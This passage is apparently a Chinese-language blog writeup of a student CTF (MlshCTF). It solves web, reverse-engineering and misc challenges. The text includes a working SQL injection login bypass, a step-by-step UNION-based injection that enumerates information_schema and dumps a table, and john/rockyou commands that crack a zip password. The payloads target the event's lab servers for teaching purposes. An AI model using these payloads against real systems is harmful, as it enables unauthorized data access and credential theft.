+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="尋旗行動"><a href="#尋旗行動" class="headerlink" title="尋旗行動"></a>尋旗行動</h3><p>點進網頁 <a class="link" target="_blank" rel="noopener" href="http://http//34.81.154.203/:10001/">http://http://34.81.154.203/:10001/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>Hint給了一個路徑/flag<br>訪問後得到flag</p>
+<h3 id="簡單的登入"><a href="#簡單的登入" class="headerlink" title="簡單的登入"></a>簡單的登入</h3><p>點進網頁 <a class="link" target="_blank" rel="noopener" href="http://http//34.81.154.203/:10002/">http://http://34.81.154.203/:10002/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/S1cj3jExR.png" alt="image"><br>根據題目，猜測說此題考的是利用SQL injection bypass登入頁面<br>f12觀察發現有給登入頁面SQL查詢的語法<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkFxTjVxA.png" alt="image"></p>
+<p><code>SELECT * FROM users WHERE username = '$user' AND password = '$pass'</code><br>得知如果我們分別在欄位Username跟Password輸入<br>Username : admin<br>Password : aaa<br>那查詢語句就會是<br><code>SELECT * FROM users WHERE username = 'admin' AND password = 'aaa'</code><br>所以我們就可以來構建我們的攻擊語句了!</p>
+<p>思路 : 因為我們不知道密碼，故需要bypass密碼驗證</p>
+<h4 id="解法-把AND後面都註解掉"><a href="#解法-把AND後面都註解掉" class="headerlink" title="解法 (把AND後面都註解掉)"></a>解法 (把AND後面都註解掉)</h4><p><code>SELECT * FROM users WHERE username = '' AND password = ''</code></p>
+<p>首先我們username先輸入admin<br>輸入 : username = admin<br>SELECT * FROM users WHERE username = ‘<font color="#f00"> admin </font>‘ AND password = ‘’</p>
+<p>因為我們要把後面都註解掉，所以我們在admin後面多加一個單引號來達成閉合<br>輸入 : username = admin’<br>SELECT * FROM users WHERE username = ‘<font color="#f00"> admin’ </font>‘ AND password = ‘’</p>
+<p>接下來我們要讓這個查詢語句成立，可以利用OR 1=1 – 來達成<br>輸入 : username = admin’ OR 1=1 – (注意–後面有空格，如沒有空格會失敗)<br>SELECT * FROM users WHERE username = ‘<font color="#f00"> admin’ OR 1=1 – </font>‘ AND password = ‘’</p>
+<p>因為1=1恆正，且後方密碼檢查被”– “註解掉，所以該查詢成立</p>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJZrY24l0.png" alt="image"></p>
+<p>ps. 如果直接複製貼上，會失敗，因為Markdown的兩個減號會合併成1個長的減號，所以建議自己手動打打看(- -去掉空格)</p>
+<p><del>p.s.，另解：通靈出來帳號為admin, 密碼為hudio23d79232@oahdaqpakk</del></p>
+<hr>
+<p>詳細可參考這篇 :　<a class="link" target="_blank" rel="noopener" href="https://feifei.tw/sql-injection/">https://feifei.tw/sql-injection/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>還有這篇 :　<a class="link" target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10189201">https://ithelp.ithome.com.tw/articles/10189201 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<hr>
+<h3 id="轉檔的奧秘"><a href="#轉檔的奧秘" class="headerlink" title="轉檔的奧秘"></a>轉檔的奧秘</h3><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="BabyReverse"><a href="#BabyReverse" class="headerlink" title="BabyReverse"></a>BabyReverse</h3><p>1.將檔案解壓縮以後，把exe檔丟到逆向工具(ida)做原碼分析<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Hy-gzLpeC.png" alt="1"><br>2.按F5，查看原代碼<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SJzVfLTx0.png" alt="2"><br>3.將三段flag結合，本題結束flag為MlshCTF{G0oD_s7uDEnt_1!K3_REVerS3}</p>
+<hr>
+<h3 id="Calculator"><a href="#Calculator" class="headerlink" title="Calculator"></a>Calculator</h3><p>1.將檔案檔丟到逆向工具(ida)做原碼分析<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJ3hGUpx0.png" alt="3"><br>2.按F5，查看原代碼<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByA6zLpeR.png" alt="4"><br>3.點進函式str(), std(), stg()尋找比對數值<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1TCzUpxC.png" alt="5"><br>4.找到三個數值，相加3113768+20190067+1609537=24913372<br>flag為MlshCTF{24913372}</p>
+<hr>
+<h3 id="mega-reverse"><a href="#mega-reverse" class="headerlink" title="mega-reverse"></a>mega-reverse</h3><h4 id="方法一-靜態分析"><a href="#方法一-靜態分析" class="headerlink" title="方法一:靜態分析"></a>方法一:靜態分析</h4><p>1.將檔案檔丟到逆向工具(ida)做原碼分析<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HywdQIpxR.png" alt="6"><br>2.按F5，查看原代碼<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJPFQITgC.png" alt="7"><br>3.進入第16行的enc()函式，找到加密flag 的方式為XOR<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HkE9X8peC.png" alt="8"><br>4.將v4和v5去掉開頭0x和結尾LL，因為是little endian，所以要反轉輸入，再串接起來<br>v4=6b6c72663835303339353830346d35756678636f7169786c656f33677073636f<br>v5=165f21147d4303416641796f505d7a4c394b310e2e1c17351e29672418000f22<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Hklqhm8TgC.png" alt="9"><br>5.兩數做XOR，就會得到反的flag:<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJ2aQ8agA.png" alt="10"><br>6.再用工具字串反轉，就可以得到正確的flag<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJU07IaxR.png" alt="11"></p>
+<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二:"></a>方法二:</h4><p>1.打開linux終端機，wget 網址到終端機<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/S1TgNUTl0.png" alt="12"><br>2.利用chmod增加執行權限<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJaxVL6xR.png" alt="13"><br>3.輸入gdb ./mega-rev ，用來打開gdb<br>(gdb 插件peda安裝請看:  <a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/am_03/article/details/119869376">https://blog.csdn.net/am_03/article/details/119869376 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Bkax4U6e0.png" alt="14"><br>4.輸入b main ，設斷點在主程式main<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJaxNUTe0.png" alt="15"><br>5.輸入r (run)就可看到code 和stack的內容<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HynIVUaxC.png" alt="16"><br>6.輸入n  (next)可以跳轉到下一行指令，按下28次後就在stack 0032 中看到flag<br>  ，原理是因為flag會在程式中解密得到，但不會輸出，所以要在stack中查看<br> flag=MlshCTF{You_aR3_9O0d_At_r3vErS3}<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/S17kBUalC.png" alt="17"></p>
+<hr>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Exploring-JPG-Images"><a href="#Exploring-JPG-Images" class="headerlink" title="Exploring JPG Images"></a>Exploring JPG Images</h3><p>利用工具查看jpg exif，這裡示範為用exiftool<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkR5KNTpT.png" alt="image"><br>看到可疑被base64編碼過後的字串<br>拿去decode得到flag<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Hk7AY4Taa.png" alt="image"></p>
+<h3 id="ZipCrack"><a href="#ZipCrack" class="headerlink" title="ZipCrack"></a>ZipCrack</h3><p>利用john加上rockyou.txt字典檔來爆破zip密碼<br>輸入指令</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip2john Flag.zip &gt; zip.hash</span><br><span class="line">john -wordlist=/usr/share/wordlists/rockyou.txt zip.hash</span><br></pre></td></tr></table></figure></div>
+<p>成功後輸入指令把密碼show出來</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john -show zip.hash</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1wh9E6aa.png" alt="image"></p>
+<p>得知密碼為zachariah1<br>利用密碼打開zip裡面的flag.txt得到flag</p>
+<h2 id="好厲害題目-Web"><a href="#好厲害題目-Web" class="headerlink" title="好厲害題目(Web)"></a>好厲害題目(Web)</h2><h3 id="先備知識"><a href="#先備知識" class="headerlink" title="先備知識"></a>先備知識</h3><p>順序<br>庫-&gt;表-&gt;欄</p>
+<table>
+<thead>
+<tr>
+<th>MySQL</th>
+<th>MsSQL</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>version()</td>
+<td>@@version</td>
+<td>得知版本</td>
+</tr>
+<tr>
+<td>database()</td>
+<td>db_name()</td>
+<td>得知當前所在的資料庫</td>
+</tr>
+<tr>
+<td>user()</td>
+<td>user</td>
+<td>得知當前使用者名稱</td>
+</tr>
+</tbody></table>
+<p>limit</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">limit 0,1 為從第一筆資料開始輸出1項</span><br><span class="line">limit 1,1 為從第二筆資料開始輸出1項</span><br></pre></td></tr></table></figure></div>
+<p>ps. MsSQL沒有limit，可用以下代替</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT * FROM !!! ORDER BY ??? OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY</span><br><span class="line">從第0行開始輸出一行</span><br><span class="line">!!!跟???自行替換</span><br></pre></td></tr></table></figure></div>
+
+<p>information_schema</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">information_schema.SCHEMATA -&gt;記錄這個SQL有哪些庫</span><br><span class="line">information_schema.TABLES -&gt;記錄這個SQL有哪些表</span><br><span class="line">information_schema.COLUMNS -&gt;記錄這個SQL有哪些欄</span><br><span class="line">table_name -&gt;表名</span><br><span class="line">columns_name -&gt;欄位名</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Sqli-1"><a href="#Sqli-1" class="headerlink" title="Sqli_1"></a>Sqli_1</h3><p>題目網址 : <a class="link" target="_blank" rel="noopener" href="http://34.81.154.203:10004/">http://34.81.154.203:10004/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>進去後先隨便點一個報導<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkC_r7QDR.png" alt="image"></p>
+<p>發現可能存在注入風險的路徑(id=1)<br>先來測試一下<br>可用<br>id = 4-2<br>id = 3-2<br>id = 1 and 1=1<br>我們用id=4-2試試看<br>會發現跑到第二篇報導了<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJVHLmQvA.png" alt="image"><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1bLImmw0.png" alt="image"></p>
+<p>由此可知這個網頁可能有sqli的漏洞<br>用UNION SELECT攻擊試試看<br>因為UNION要兩邊個數一樣<br>先試試看<br><code>UNION SELECT 1</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rk_gDQmP0.png" alt="image"></p>
+<p>發現啥都沒有，代表不只有一個，再試試看兩個<br><code>UNION SELECT 1,1</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1OXwmXvR.png" alt="image"></p>
+<p>也是甚麼都沒有，再來試3個<br><code>UNION SELECT 1,1,1</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/r1YDv7QDR.png" alt="image"></p>
+<p>發現這次有東西了，所以我們可以把1,1,1都換成version(),user(),database()試試看</p>
+<p><code>UNION SELECT version(),user(),database()</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/S1yQu7XvA.png" alt="image"></p>
+<p>第三個跑不出來所以在UNION一次<br><code>UNION SELECT version(),database(),1</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SkgUOXmv0.png" alt="image"></p>
+<p>得知我們現在在mysql_union這個資料庫裡<br>找到庫了，接下來要來找這個庫有哪些表<br><code>information_schema.tables</code>這裡記錄所有的表<br>所以可以輸入<br><code>0 UNION SELECT table_name,1,2 from information_schema.tables WHERE table_schema = 'mysql_union'</code><br>這句話的意思大概是<br>從’information_schema.tables’找出有在’mysql_union’庫裡面的表<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1UlcXmPC.png" alt="image"></p>
+<p>找到了flags這個表<br>接下來找這個表有哪些欄<br><code>0 UNION SELECT column_name,1,1  from information_schema.columns where table_name = 'flags'</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SyNjc77DR.png" alt="image"></p>
+<p>會發現找到了content這個欄位<br>就可以來看這個欄位的內容拉<br><code>0 UNION SELECT content,2,3 from flags</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HymzjX7vR.png" alt="image"></p>
+<p>!居然沒有flag，這時候就要用到limit了，因為我們一次只能輸出一列，而limit可以限制要輸出哪一列，所以我們讓他輸出第二列</p>
+<p><code>0 UNION SELECT content,2,3 from flags limit 1,1</code></p>
+<p>得到flag<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SkoNhXXwR.png" alt="image"></p>
+<p>補充</p>
+<p>除了content這個欄位<br>輸入<br><code>0 UNION SELECT column_name,2,3  from information_schema.columns where table_name = 'flags' limit 1,1</code></p>
+<p>會發現還有一個欄位是id<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJ6O1NXDC.png" alt="image"></p>
+<p>輸入<br><code>0 UNION SELECT id,content,3 from flags limit 0,1</code><br>回傳<br>1 (id)<br>Oops, not here (content)<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJ3h1E7DC.png" alt="image"></p>
+<p>輸入<br><code>0 UNION SELECT id,content,3 from flags limit 1,1</code><br>回傳<br>2 (id)<br>MlshCTF{…} (content)<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HkvGxNXvR.png" alt="image"></p>
+<p>用sqlmap看的話就是長這樣<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJHLQ47DA.png" alt="image"></p>
+<p>前面其實mysql_union也不只有flags這張表，都可以用limit玩看看<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJcAN4mDR.png" alt="image"></p>
+<p>希望這樣有更清楚一點XD</p>
+<h3 id="Sqli-2"><a href="#Sqli-2" class="headerlink" title="Sqli_2"></a>Sqli_2</h3><h3 id="Sqli-3"><a href="#Sqli-3" class="headerlink" title="Sqli_3"></a>Sqli_3</h3><h3 id="Sqli-nogamenolife"><a href="#Sqli-nogamenolife" class="headerlink" title="Sqli_nogamenolife"></a>Sqli_nogamenolife</h3><h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3>
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> MlshCTF-Writeup</li>
+        <li><strong>Author:</strong> Zerocatw</li>
+        <li><strong>Created at
+                :</strong> 2024-07-20 02:31:26</li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2024/07/20/MlshCTF-Writeup/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/Writeup/">#Writeup</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2024/07/20/ithome2024/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">iThome2023-Security</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">MlshCTF-Writeup</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Welcome"><span class="nav-text">Welcome</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Welcome-1"><span class="nav-text">Welcome</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn"><span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Guess-a-Number"><span class="nav-text">Guess a Number</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Math"><span class="nav-text">Math</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BabyOverFlow"><span class="nav-text">BabyOverFlow</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#How-old-are-you"><span class="nav-text">How old are you?</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#BabyXOR"><span class="nav-text">BabyXOR</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Classical-Cipher"><span class="nav-text">Classical Cipher</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RSA%E4%BB%8B%E7%B4%B9"><span class="nav-text">RSA介紹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RSA-Easy"><span class="nav-text">RSA_Easy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RSA-Advance"><span class="nav-text">RSA_Advance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#The-secret-message"><span class="nav-text">The secret message</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8B%E6%97%97%E8%A1%8C%E5%8B%95"><span class="nav-text">尋旗行動</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B0%A1%E5%96%AE%E7%9A%84%E7%99%BB%E5%85%A5"><span class="nav-text">簡單的登入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BD%89%E6%AA%94%E7%9A%84%E5%A5%A7%E7%A7%98"><span class="nav-text">轉檔的奧秘</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse"><span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#BabyReverse"><span class="nav-text">BabyReverse</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Calculator"><span class="nav-text">Calculator</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mega-reverse"><span class="nav-text">mega-reverse</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploring-JPG-Images"><span class="nav-text">Exploring JPG Images</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ZipCrack"><span class="nav-text">ZipCrack</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A5%BD%E5%8E%B2%E5%AE%B3%E9%A1%8C%E7%9B%AE-Web"><span class="nav-text">好厲害題目(Web)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%88%E5%82%99%E7%9F%A5%E8%AD%98"><span class="nav-text">先備知識</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sqli-1"><span class="nav-text">Sqli_1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sqli-2"><span class="nav-text">Sqli_2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sqli-3"><span class="nav-text">Sqli_3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sqli-nogamenolife"><span class="nav-text">Sqli_nogamenolife</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LFI"><span class="nav-text">LFI</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-regular fa-computer-classic"></i>&nbsp;&nbsp;<a href="/">Zerocatw</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        12 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.4</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="fa-regular fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/libs/anime.min.js"></script>
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
